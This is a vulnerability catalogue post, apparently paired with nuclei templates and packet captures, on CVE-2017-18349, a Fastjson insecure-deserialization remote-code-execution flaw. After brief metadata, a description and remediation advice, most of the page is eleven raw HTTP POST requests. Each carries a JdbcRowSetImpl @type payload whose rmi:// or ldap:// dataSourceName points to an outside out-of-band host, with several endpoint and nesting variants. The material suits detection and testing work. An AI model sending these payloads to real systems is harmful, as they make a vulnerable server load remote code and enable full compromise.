---
layout: post
cve_id: CVE-2017-18349
title: Fastjson Insecure Deserialization - Remote Code Execution
pcap: true
pcap_path: /pcaps/2017/CVE-2017-18349.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2017/CVE-2017-18349.yaml
snort2_rule: N/A
snort3_rule: N/A
author: night
severity: critical
impact: 'Successful exploitation allows complete system compromise through remote
  code execution, enabling attackers to execute arbitrary commands, access sensitive
  data, and establish persistent backdoors on the target system.

  '
remediation: 'Update Fastjson to version 1.2.25 or later which includes security patches
  for this vulnerability.Disable autotype functionality by setting `fastjson.parser.autoTypeSupport=false`.Implement
  strict whitelist filtering for `@type` annotations, validate and sanitize all JSON
  input.Use Web Application Firewalls (WAF) to filter malicious requests, and regularly
  audit dependencies for known vulnerabilities. Consider migrating to safer JSON parsing
  libraries like Jackson with secure configurations.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2017-18349
- https://github.com/alibaba/fastjson/wiki/security_update_20170315
- https://github.com/pippo-java/pippo/issues/466
- https://github.com/h0cksr/Fastjson--CVE-2017-18349-
- https://fortiguard.com/encyclopedia/ips/44059
- https://www.exploit-db.com/exploits/45983
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2017-18349
  cwe-id: CWE-20
  epss-score: 0.92079
  epss-percentile: 0.9969
  cpe: cpe:2.3:a:alibaba:fastjson:*:*:*:*:*:*:*:*
metadata:
  verified: true
  vendor: alibaba
  product: fastjson
tags:
- cve
- cve2017
- fastjson
- deserialization
- rce
- oob
- oast
- vkev
- vuln
---

## üîç Vulnerability Description
parseObject in Fastjson before 1.2.25, as used in FastjsonEngine in Pippo 1.11.0 and other products, allows remote attackers to execute arbitrary code via a crafted JSON request, as demonstrated by a crafted rmi-// URI in the dataSourceName field of HTTP POST data to the Pippo /json URI, which is mishandled in AjaxApplication.java.


## üåê HTTP Request
```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Safari
Connection: close
Content-Length: 175
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://d5jqachle0o1j23aerl0wzcdj4bg6fm7p.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
  "autoCommit": true
}
```

```nohighlight
POST /api/json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:140.0) Gecko/20100101 Firefox/140.0
Connection: close
Content-Length: 175
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://d5jqachle0o1j23aerl0sgw9kdcqup1dn.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
  "autoCommit": true
}
```

```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Connection: close
Content-Length: 176
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d5jqachle0o1j23aerl0rouzda99oqm7d.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
  "autoCommit": true
}
```

```nohighlight
POST /api/json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Connection: close
Content-Length: 176
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d5jqachle0o1j23aerl0gupips891rcz9.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
  "autoCommit": true
}
```

```nohighlight
POST /parse HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
Connection: close
Content-Length: 176
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d5jqachle0o1j23aerl0bh1ku9txdh3pi.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
  "autoCommit": true
}
```

```nohighlight
POST /deserialize HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_3; nl-nl) AppleWebKit/527+ (KHTML, like Gecko) Version/3.1.1 Safari/525.20
Connection: close
Content-Length: 176
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://d5jqachle0o1j23aerl0115337hz51xeu.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
  "autoCommit": true
}
```

```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/15.4 Safari/537.36
Connection: close
Content-Length: 199
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d5jqachle0o1j23aerl07uk44i77tusy1.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
    "autoCommit": true
  }
}
```

```nohighlight
POST /api/json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Connection: close
Content-Length: 199
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d5jqachle0o1j23aerl0dqwcqhkmberb9.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
    "autoCommit": true
  }
}
```

```nohighlight
POST /parse HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0
Connection: close
Content-Length: 199
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d5jqachle0o1j23aerl0fm7ubntgdygez.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
    "autoCommit": true
  }
}
```

```nohighlight
POST /deserialize HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Debian; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 199
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "data": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "rmi://d5jqachle0o1j23aerl0j5c14rneam9q4.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
    "autoCommit": true
  }
}
```

```nohighlight
POST /json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Safari/605.1.15
Connection: close
Content-Length: 197
Accept: application/json
Accept-Language: en
Content-Type: application/json
Accept-Encoding: gzip

{
  "b": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://d5jqachle0o1j23aerl0zcwog854of9kc.oast.live/38FfKqvMU0jbXs2Q4vsDL2hl6dH",
    "autoCommit": true
  }
}
```

